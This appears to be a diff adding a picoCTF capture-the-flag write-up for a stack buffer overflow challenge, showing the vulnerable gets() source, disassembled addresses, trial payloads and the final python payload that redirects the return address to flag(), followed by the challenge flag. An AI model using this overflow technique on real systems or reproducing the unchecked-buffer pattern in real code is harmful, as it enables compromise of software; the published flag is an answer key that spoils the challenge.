@@ -1,0 +1,71 @@
+OverFlow 1: Binary Exploitation
+
+You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program?
+You can find it in /problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389 on the shell server. Source.
+
+----------------------------------------
+
+* asks for string, and tries to jump to return address
+
+Woah, were jumping to 0x8048705 !
+
+
+* need to overwrite the return address in vuln() to jump to flag() :
+
+#define BUFFSIZE 64
+#define FLAGSIZE 64
+
+char buf[BUFFSIZE];
+gets(buf);
+
+printf("Woah, were jumping to 0x%x !\n", get_return_address());
+
+
+* disassemble find the addresses:
+
+objdump -d vuln
+
+...
+080485e6 <flag>:
+...
+0804865f <vuln>:
+...
+0804869e <main>:
+...
+
+
+* user input needs to be like:
+
+buffer[64] + padding[?] + return_address[4]
+
+
+* trial and error until see a change:
+
+python -c 'print "a"*64 + "b"*8 + "c"*4' | ./vuln
+
+Woah, were jumping to 0x8048700 !
+
+Woah, were jumping to 0x8048705 !
+Segmentation fault (core dumped)
+
+
+python -c 'print "a"*64 + "b"*12 + "c"*4' | ./vuln
+
+Woah, were jumping to 0x63636363 !
+Segmentation fault (core dumped)
+
+
+* final input:
+
+little endian address
+
+080485e6  -->  '\xe6' + '\x85' + '\x04' + '\x08'
+
+76 chars + address
+
+python -c 'print "A"*76 + "\xe6\x85\x04\x08"' | ./vuln
+
+----------------------------------------
+
+picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}
+
